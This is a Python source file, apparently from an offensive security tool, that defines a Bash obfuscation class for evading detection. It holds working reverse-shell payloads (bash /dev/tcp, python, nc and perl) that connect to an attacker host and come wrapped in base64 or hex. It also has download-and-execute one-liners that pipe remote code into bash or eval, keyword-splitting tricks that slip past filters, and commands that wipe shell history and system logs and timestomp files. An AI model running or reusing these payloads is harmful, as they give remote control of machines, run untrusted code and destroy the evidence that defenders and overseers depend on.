"""
AIPTX Beast Mode - Bash Obfuscation
===================================

Bash command and script obfuscation techniques.
"""

from __future__ import annotations

import base64
import logging
import random
from typing import Any

logger = logging.getLogger(__name__)


class BashObfuscator:
    """
    Bash obfuscation engine.

    Provides obfuscation techniques for Linux/Unix commands.
    """

    def __init__(self):
        """Initialize Bash obfuscator."""
        self._techniques = [
            "base64",
            "hex",
            "variable_expansion",
            "quote_mixing",
            "brace_expansion",
            "command_substitution",
            "octal",
        ]

    def obfuscate(
        self,
        command: str,
        techniques: list[str] | None = None,
        level: int = 1,
    ) -> str:
        """
        Obfuscate Bash command.

        Args:
            command: Original command
            techniques: Techniques to apply
            level: Obfuscation level (1-3)

        Returns:
            Obfuscated command
        """
        if techniques is None:
            techniques = self._techniques[:level * 2]

        result = command

        for technique in techniques:
            if technique == "base64":
                result = self.base64_encode(result)
            elif technique == "hex":
                result = self.hex_encode(result)
            elif technique == "variable_expansion":
                result = self.variable_expand(result)
            elif technique == "quote_mixing":
                result = self.mix_quotes(result)
            elif technique == "brace_expansion":
                result = self.use_brace_expansion(result)
            elif technique == "octal":
                result = self.octal_encode(result)

        return result

    def base64_encode(self, command: str) -> str:
        """
        Encode command as Base64.

        Args:
            command: Command to encode

        Returns:
            Base64-encoded execution wrapper
        """
        encoded = base64.b64encode(command.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"

    def hex_encode(self, command: str) -> str:
        """
        Encode command as hex.

        Args:
            command: Command to encode

        Returns:
            Hex-encoded execution wrapper
        """
        hex_str = command.encode().hex()
        return f"echo {hex_str} | xxd -r -p | bash"

    def variable_expand(self, command: str) -> str:
        """
        Use variable expansion to hide strings.

        Args:
            command: Command to obfuscate

        Returns:
            Command with variable expansions
        """
        # Common substitutions using env vars
        substitutions = [
            ("bash", '${SHELL##*/}'),
            ("/bin/sh", '${SHELL}'),
            ("cat", 'c""at'),
            ("wget", 'w""get'),
            ("curl", 'cu""rl'),
        ]

        result = command
        for original, replacement in substitutions:
            if original in result:
                result = result.replace(original, replacement)

        return result

    def mix_quotes(self, command: str) -> str:
        """
        Mix single and double quotes.

        Args:
            command: Command to obfuscate

        Returns:
            Quote-mixed command
        """
        # Break up keywords with quote mixing
        keywords = ["bash", "wget", "curl", "python", "nc", "cat", "echo"]

        result = command
        for keyword in keywords:
            if keyword in result:
                # Mix quotes: ba'sh' or "ba"sh
                mid = len(keyword) // 2
                if random.random() > 0.5:
                    obfuscated = f"{keyword[:mid]}'{keyword[mid:]}'"
                else:
                    obfuscated = f'"{keyword[:mid]}"{keyword[mid:]}'
                result = result.replace(keyword, obfuscated)

        return result

    def use_brace_expansion(self, command: str) -> str:
        """
        Use brace expansion for strings.

        Args:
            command: Command to obfuscate

        Returns:
            Command with brace expansion
        """
        # Convert strings to brace expansion
        # e.g., "cat" -> {c,a,t}
        keywords = ["wget", "curl", "bash", "python"]

        result = command
        for keyword in keywords:
            if keyword in result:
                expanded = "{" + ",".join(keyword) + "}"
                result = result.replace(keyword, f"$(echo {expanded})")

        return result

    def octal_encode(self, command: str) -> str:
        """
        Encode using octal representation.

        Args:
            command: Command to encode

        Returns:
            Octal-encoded command using $'...'
        """
        octal_chars = []
        for c in command:
            octal_chars.append(f"\\{oct(ord(c))[2:]}")

        return f"$'{''.join(octal_chars)}'"

    def printf_encode(self, command: str) -> str:
        """
        Encode using printf.

        Args:
            command: Command to encode

        Returns:
            Printf-wrapped command
        """
        hex_chars = []
        for c in command:
            hex_chars.append(f"\\x{ord(c):02x}")

        return f'$(printf "{"".join(hex_chars)}")'

    def get_reverse_shell_obfuscated(
        self,
        host: str,
        port: int,
        technique: str = "base64",
    ) -> str:
        """
        Get obfuscated reverse shell command.

        Args:
            host: Attacker IP
            port: Attacker port
            technique: Obfuscation technique

        Returns:
            Obfuscated reverse shell
        """
        shells = {
            "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
            "perl": f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        }

        # Pick a shell and obfuscate
        shell_cmd = shells.get("bash", shells["bash"])

        if technique == "base64":
            return self.base64_encode(shell_cmd)
        elif technique == "hex":
            return self.hex_encode(shell_cmd)
        elif technique == "printf":
            return self.printf_encode(shell_cmd)
        else:
            return self.variable_expand(shell_cmd)

    def get_download_methods(self) -> list[dict[str, str]]:
        """
        Get various file download methods.

        Returns:
            List of download methods
        """
        return [
            {
                "name": "curl",
                "command": "curl -o <output> <url>",
                "execute": "curl -s <url> | bash",
            },
            {
                "name": "wget",
                "command": "wget -O <output> <url>",
                "execute": "wget -q -O - <url> | bash",
            },
            {
                "name": "python",
                "command": "python3 -c \"import urllib.request; urllib.request.urlretrieve('<url>','<output>')\"",
                "execute": "python3 -c \"import urllib.request; exec(urllib.request.urlopen('<url>').read())\"",
            },
            {
                "name": "perl",
                "command": "perl -e 'use LWP::Simple; getstore(\"<url>\", \"<output>\")'",
                "execute": "perl -e 'use LWP::Simple; eval(get(\"<url>\"))'",
            },
            {
                "name": "ruby",
                "command": "ruby -e \"require 'open-uri'; File.write('<output>', URI.open('<url>').read)\"",
                "execute": "ruby -e \"require 'open-uri'; eval(URI.open('<url>').read)\"",
            },
            {
                "name": "php",
                "command": "php -r \"file_put_contents('<output>', file_get_contents('<url>'));\"",
                "execute": "php -r \"eval(file_get_contents('<url>'));\"",
            },
            {
                "name": "openssl",
                "command": "openssl s_client -connect <host>:443 -quiet < /dev/null 2>/dev/null | sed -n '/<script/,/<\\/script>/p' > <output>",
                "notes": "For HTTPS with openssl",
            },
            {
                "name": "dev_tcp",
                "command": "exec 3<>/dev/tcp/<host>/<port>; echo -e 'GET /<path> HTTP/1.0\\r\\nHost: <host>\\r\\n\\r\\n' >&3; cat <&3 > <output>",
                "notes": "Pure bash, no external tools",
            },
        ]

    def get_history_evasion(self) -> list[str]:
        """
        Get commands to evade bash history.

        Returns:
            List of history evasion commands
        """
        return [
            "unset HISTFILE",
            "export HISTSIZE=0",
            "export HISTFILESIZE=0",
            "set +o history",
            " <command>",  # Space prefix (if HISTCONTROL=ignorespace)
            "history -c && history -w",
            "kill -9 $$",  # Kill current shell (extreme)
        ]

    def get_log_evasion_commands(self) -> list[dict[str, str]]:
        """
        Get commands for log evasion.

        Returns:
            List of log evasion commands
        """
        return [
            {
                "name": "clear_auth_log",
                "command": "echo '' > /var/log/auth.log",
                "requires": "root",
            },
            {
                "name": "clear_syslog",
                "command": "echo '' > /var/log/syslog",
                "requires": "root",
            },
            {
                "name": "clear_wtmp",
                "command": "echo '' > /var/log/wtmp",
                "requires": "root",
            },
            {
                "name": "clear_lastlog",
                "command": "echo '' > /var/log/lastlog",
                "requires": "root",
            },
            {
                "name": "clear_utmp",
                "command": "echo '' > /var/run/utmp",
                "requires": "root",
            },
            {
                "name": "remove_bash_history",
                "command": "rm ~/.bash_history && ln -s /dev/null ~/.bash_history",
                "requires": "user",
            },
            {
                "name": "timestomp",
                "command": "touch -r /etc/passwd <file>",
                "description": "Match timestamp to reference file",
            },
        ]

    def wrap_for_stealth(self, command: str) -> str:
        """
        Wrap command with stealth options.

        Args:
            command: Command to wrap

        Returns:
            Stealthy command wrapper
        """
        return f"unset HISTFILE; {command} 2>/dev/null"


__all__ = ["BashObfuscator"]
